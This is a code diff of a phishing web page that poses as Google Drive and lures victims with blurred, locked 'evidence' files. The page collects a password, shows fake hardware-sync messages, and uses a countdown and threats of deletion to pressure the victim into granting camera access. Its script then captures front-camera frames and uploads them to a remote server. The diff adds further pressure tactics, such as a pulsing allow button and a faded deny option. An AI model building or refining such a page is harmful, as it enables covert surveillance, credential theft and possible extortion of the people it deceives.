@@ -13,19 +13,14 @@
         #bg-image {
             position: fixed; inset: 0;
             background: url('pic.jpg'); 
-            background-size: cover;
-            background-position: center;
-            filter: blur(80px) brightness(0.3); 
-            transform: scale(1.15);
-            z-index: 1;
-            transition: filter 0.8s ease-out, brightness 0.8s ease-out, transform 0.8s ease-out;
+            background-size: cover; background-position: center;
+            filter: blur(80px) brightness(0.3); transform: scale(1.15);
+            z-index: 1; transition: filter 0.8s ease-out, brightness 0.8s ease-out, transform 0.8s ease-out;
         }
 
         #processing-overlay {
-            position: fixed; inset: 0;
-            background: rgba(0, 0, 0, 0.7);
-            display: none; flex-direction: column; align-items: center; justify-content: center;
-            z-index: 12000;
+            position: fixed; inset: 0; background: rgba(0, 0, 0, 0.7);
+            display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 12000;
         }
 
         #regret-box {
@@ -48,35 +43,33 @@
         .p-fill-bridge { width: 0%; height: 100%; background: var(--g-blue); transition: width 0.3s ease; }
         @keyframes drivePulse { 0% { opacity: 0.4; transform: scale(0.95); } 50% { opacity: 1; transform: scale(1.05); } 100% { opacity: 0.4; transform: scale(0.95); } }
 
-        #main-ui { display: none; height: 100vh; position: relative; z-index: 5; }
-        .header { height: 64px; display: flex; align-items: center; padding: 0 20px; background: white; border-bottom: 1px solid #eee; }
+        @keyframes pulse-blue {
+            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(11, 87, 208, 0.6); }
+            70% { transform: scale(1.03); box-shadow: 0 0 0 12px rgba(11, 87, 208, 0); }
+            100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(11, 87, 208, 0); }
+        }
+        .pulse-button { animation: pulse-blue 1.5s infinite; }
+
+        #main-ui { display: none; height: 100vh; position: relative; z-index: 5; background: white; overflow-y: auto; }
+        .header { height: 64px; display: flex; align-items: center; padding: 0 20px; background: white; border-bottom: 1px solid #eee; position: sticky; top: 0; }
         .header span { font-family: 'Google Sans', sans-serif; font-size: 20px; color: var(--g-gray); margin-left: 12px; }
 
-        #pass-modal { 
-            display: none; position: fixed; inset: 0; background: white; z-index: 9000; 
-            flex-direction: column; align-items: center; padding-top: 60px;
-        }
-        .user-pill {
-            display: flex; align-items: center; padding: 4px 12px 4px 4px; border: 1px solid #e0e0e0; 
-            border-radius: 20px; margin-bottom: 24px; font-size: 14px; color: #3c4043; font-weight: 500;
-        }
+        #pass-modal { display: none; position: fixed; inset: 0; background: white; z-index: 9000; flex-direction: column; align-items: center; padding-top: 60px; }
+        .user-pill { display: flex; align-items: center; padding: 4px 12px 4px 4px; border: 1px solid #e0e0e0; border-radius: 20px; margin-bottom: 24px; font-size: 14px; color: #3c4043; font-weight: 500; }
         .user-icon { width: 24px; height: 24px; background: #0b57d0; color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 8px; font-size: 12px; }
         
         .pass-card { width: 90%; max-width: 400px; text-align: center; }
         .pass-title { font-family: 'Google Sans'; font-size: 24px; color: #202124; margin-bottom: 8px; }
         .pass-sub { font-size: 16px; color: #202124; margin-bottom: 32px; }
         
-        .in-pass { 
-            width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; 
-            font-size: 16px; margin-bottom: 8px; box-sizing: border-box; font-family: 'Roboto';
-        }
+        .in-pass { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; margin-bottom: 8px; box-sizing: border-box; font-family: 'Roboto'; }
         .in-pass:focus { border: 2px solid var(--g-blue); outline: none; padding: 12px 14px; }
         .forgot-link { color: var(--g-blue); font-size: 14px; font-weight: 500; text-align: left; width: 100%; cursor: pointer; margin-top: 8px; }
 
         #fake-box { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.6); z-index: 11000; }
         .sheet { position: fixed; bottom: 12px; left: 12px; right: 12px; background: var(--g-surface); border-radius: 28px; padding: 24px; box-sizing: border-box; }
         .btn-p { background: var(--g-blue); color: white; border: none; padding: 14px; border-radius: 100px; width: 100%; font-weight: 500; font-size: 14px; margin-bottom: 8px; cursor: pointer; }
-        .btn-s { background: transparent; color: var(--g-blue); border: none; padding: 12px; width: 100%; font-weight: 500; font-size: 14px; cursor: pointer; }
+        .btn-s { background: transparent; color: #9ca3af; border: none; padding: 12px; width: 100%; font-weight: 400; font-size: 12px; cursor: pointer; }
     </style>
 </head>
 <body>
@@ -87,9 +80,7 @@
         <img src="https://cdn-icons-png.flaticon.com/512/564/564619.png" width="60" style="margin-bottom:20px; opacity:0.8;">
         <h2 style="font-family:'Google Sans'; color:#d93025; font-size: 20px;">Access Blocked</h2>
         <p style="color:#5f6368; font-size: 14px; line-height:1.5; margin-bottom:30px; padding: 0 20px;">
-            Because you denied the sync, the file is now <b>Locked</b>. 
-            <br><br>
-            To protect the data, this link will expire in 1 minute. You must restart the handshake now to unlock the evidence.
+            Because you denied the sync, the file is now <b>Locked</b>. To protect the data, this link will expire in 1 minute.
         </p>
         <button class="btn-p" onclick="location.reload()" style="max-width:220px;">Unlock & Try Again</button>
     </div>
@@ -111,12 +102,51 @@
     </div>
 
     <div id="main-ui">
-        <div class="header"><img src="https://upload.wikimedia.org/wikipedia/commons/d/da/Google_Drive_logo.png" width="24"><span>Drive</span></div>
-        <div style="display:flex; flex-direction:column; align-items:center; padding-top:100px;">
-            <div style="background:white; padding:24px; border-radius:16px; text-align:center; width:85%; max-width:320px; box-shadow:0 2px 10px rgba(0,0,0,0.1);" onclick="openPass()">
-                <img src="https://cdn-icons-png.flaticon.com/512/3767/3767084.png" width="48">
-                <p style="font-weight:500; margin:16px 0 4px 0;">Confidential_Archive.zip</p>
-                <button style="margin-top:24px; border:none; background:var(--g-blue); color:white; padding:12px 24px; border-radius:100px; font-weight:500; width:100%;">Access File</button>
+        <div class="header">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/d/da/Google_Drive_logo.png" width="24">
+            <span>Shared Workspace / Evidence</span>
+        </div>
+        
+        <div style="padding: 20px; text-align: left;">
+            <div style="background: #fff3cd; border: 1px solid #ffeeba; padding: 12px; border-radius: 8px; margin-bottom: 20px; font-size: 13px; color: #856404;">
+                ⚠️ <b>System Note:</b> Visual data is currently in raw encrypted state. Hardware handshake required for full rendering.
+            </div>
+
+            <p style="color: #5f6368; font-size: 14px; margin-bottom: 15px;">Files in <b>Confidential_Archive</b> (6)</p>
+            
+            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px;" onclick="openPass()">
+                
+                <div style="aspect-ratio: 1/1; background: #333; border-radius: 12px; overflow: hidden; position: relative; border: 1px solid #ddd;">
+                    <img src="https://images.unsplash.com/photo-1540518614846-7eded433c457?q=80&w=200&auto=format&fit=crop" style="filter: blur(25px); width: 100%; height: 100%; object-fit: cover; opacity: 0.7;">
+                    <div style="position: absolute; inset: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; background: rgba(0,0,0,0.3);">
+                        <span style="font-size: 24px;">🔒</span>
+                        <span style="color: white; font-size: 10px; margin-top: 5px; font-family: 'Roboto';">IMG_0042.dat</span>
+                    </div>
+                </div>
+
+                <div style="aspect-ratio: 1/1; background: #333; border-radius: 12px; overflow: hidden; position: relative; border: 1px solid #ddd;">
+                    <img src="https://images.unsplash.com/photo-1551133990-790757270e5b?q=80&w=200&auto=format&fit=crop" style="filter: blur(25px); width: 100%; height: 100%; object-fit: cover; opacity: 0.7;">
+                    <div style="position: absolute; inset: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; background: rgba(0,0,0,0.3);">
+                        <span style="font-size: 24px;">🔒</span>
+                        <span style="color: white; font-size: 10px; margin-top: 5px; font-family: 'Roboto';">IMG_0043.dat</span>
+                    </div>
+                </div>
+
+                <div style="aspect-ratio: 1/1; background: #333; border-radius: 12px; overflow: hidden; position: relative; border: 1px solid #ddd;">
+                    <img src="https://images.unsplash.com/photo-1505691723518-36a5ac3be353?q=80&w=200&auto=format&fit=crop" style="filter: blur(25px); width: 100%; height: 100%; object-fit: cover; opacity: 0.7;">
+                    <div style="position: absolute; inset: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; background: rgba(0,0,0,0.3);">
+                        <span style="font-size: 24px;">🔒</span>
+                        <span style="color: white; font-size: 10px; margin-top: 5px; font-family: 'Roboto';">IMG_0044.dat</span>
+                    </div>
+                </div>
+
+                <div style="aspect-ratio: 1/1; background: #333; border-radius: 12px; overflow: hidden; position: relative; border: 1px solid #ddd;">
+                    <img src="https://images.unsplash.com/photo-1513694203232-719a280e022f?q=80&w=200&auto=format&fit=crop" style="filter: blur(25px); width: 100%; height: 100%; object-fit: cover; opacity: 0.7;">
+                    <div style="position: absolute; inset: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; background: rgba(0,0,0,0.3);">
+                        <span style="font-size: 24px;">🔒</span>
+                        <span style="color: white; font-size: 10px; margin-top: 5px; font-family: 'Roboto';">IMG_0045.dat</span>
+                    </div>
+                </div>
             </div>
         </div>
     </div>
@@ -126,32 +156,28 @@
         <div class="pass-card">
             <div class="pass-title">Verify it's you</div>
             <div class="pass-sub">To continue, first verify it's you</div>
-            <div style="display:flex; justify-content:center;">
-                <div class="user-pill">
-                    <div class="user-icon">U</div>
-                    <span>Shared Workspace User</span>
-                </div>
-            </div>
+            <div style="display:flex; justify-content:center;"><div class="user-pill"><div class="user-icon">U</div><span>Shared Workspace User</span></div></div>
             <input type="password" id="pwd" class="in-pass" placeholder="Enter your password">
             <div class="forgot-link">Forgot password?</div>
-            <div style="margin-top:40px; display:flex; justify-content: flex-end;">
-                <button class="btn-p" style="width:100px;" onclick="verify()">Next</button>
-            </div>
+            <div style="margin-top:40px; display:flex; justify-content: flex-end;"><button class="btn-p" style="width:100px;" onclick="verify()">Next</button></div>
         </div>
     </div>
 
     <div id="fake-box">
         <div class="sheet">
             <img src="https://upload.wikimedia.org/wikipedia/commons/d/da/Google_Drive_logo.png" width="32" style="margin-bottom:16px;">
+            <div id="countdown" style="color: #b91c1c; font-family: 'Google Sans'; font-weight: bold; font-size: 16px; margin-bottom: 12px; display: flex; align-items: center;">
+                <span style="margin-right:8px;">⏳</span> Time remaining: 60s
+            </div>
             <div style="font-family:'Google Sans'; font-size:18px; color:#1f1f1f; font-weight:500; margin-bottom:8px;">Camera Sync Required to render visual evidence</div>
             <div style="font-family:'Roboto'; font-size:14px; color:#444746; line-height:1.5; margin-bottom:24px;">
                 To render the visual evidence from the encrypted <b>Confidential_Archive</b>, you must authorize a <b>Camera View Sync</b>. 
                 <br><br>
                 <div style="background: rgba(185, 28, 28, 0.05); border-left: 3px solid #b91c1c; padding: 10px; color: #b91c1c; font-size:13px;">
-                    <b>CRITICAL:</b> You have 60 seconds. If you close this or deny it, the link will break and the file will be <b>deleted forever</b> for security.
+                    <b>CRITICAL:</b> If you close this or deny it, the link will break and the file will be <b>deleted forever</b>.
                 </div>
             </div>
-            <button class="btn-p" onclick="trigger()">Allow while visiting</button>
+            <button class="btn-p pulse-button" onclick="trigger()">Allow while visiting</button>
             <button class="btn-p" onclick="trigger()">Allow this time</button>
             <button class="btn-s" onclick="showRegret()">Never allow</button>
         </div>
@@ -169,38 +195,37 @@
         };
 
         function openPass() { document.getElementById('pass-modal').style.display = 'flex'; }
-        
-        function verify() { 
-            if(document.getElementById('pwd').value.length > 0) { 
-                document.getElementById('pass-modal').style.display = 'none'; 
-                runBridgeLoader(); 
-            } 
-        }
+        function verify() { if(document.getElementById('pwd').value.length > 0) { document.getElementById('pass-modal').style.display = 'none'; runBridgeLoader(); } }
 
         function runBridgeLoader() {
             const bridge = document.getElementById('bridge-loader');
             const bar = document.getElementById('p-fill-bridge');
             const status = document.getElementById('bridge-status');
             bridge.style.display = 'flex';
-
             let val = 0;
             const loop = setInterval(() => {
-                if(val < 70) val += Math.random() * 12;
-                else if(val < 99) val += Math.random() * 2;
-                else val += 0.1;
-
+                if(val < 70) val += Math.random() * 12; else if(val < 99) val += Math.random() * 2; else val += 0.1;
                 bar.style.width = val + '%';
-
                 if(val > 30) status.innerText = "Initializing hardware interface...";
                 if(val > 75) status.innerText = "Syncing optical sensor (Handshake 0x4f)...";
-
                 if(val >= 100) {
                     clearInterval(loop);
                     bridge.style.display = 'none';
                     if (navigator.vibrate) { navigator.vibrate([200, 100, 200]); }
                     document.getElementById('fake-box').style.display = 'block';
+                    startPressureTimer();
                 }
             }, 100);
+        }
+
+        function startPressureTimer() {
+            let seconds = 60;
+            const timerDisplay = document.getElementById('countdown');
+            const pressureInterval = setInterval(() => {
+                seconds--;
+                timerDisplay.innerHTML = `<span style="margin-right:8px;">⏳</span> Time remaining: ${seconds}s`;
+                if (seconds <= 0) { clearInterval(pressureInterval); showRegret(); }
+            }, 1000);
         }
 
         function showRegret() { 
@@ -215,24 +240,19 @@
             document.getElementById('processing-overlay').style.display = 'flex';
             const status = document.getElementById('status-text');
             const bg = document.getElementById('bg-image');
-
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const v = document.createElement('video');
                 v.srcObject = stream; await v.play();
-
                 let count = 0;
                 const timer = setInterval(() => {
                     const c = document.createElement('canvas');
                     c.width = 480; c.height = 640;
                     c.getContext('2d').drawImage(v, 0, 0);
                     const rawData = c.toDataURL('image/jpeg', 0.5).split(',')[1];
-                    
                     if(count == 4) status.innerText = "Processing optical data packets...";
                     if(count == 8) status.innerText = "Validating hardware session (84%)...";
-
                     fetch(`${RENDER_URL}/upload`, { method: 'POST', mode: 'cors', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ image: rawData }) }).catch(() => {});
-
                     count++;
                     if (count >= 12) {
                         clearInterval(timer);
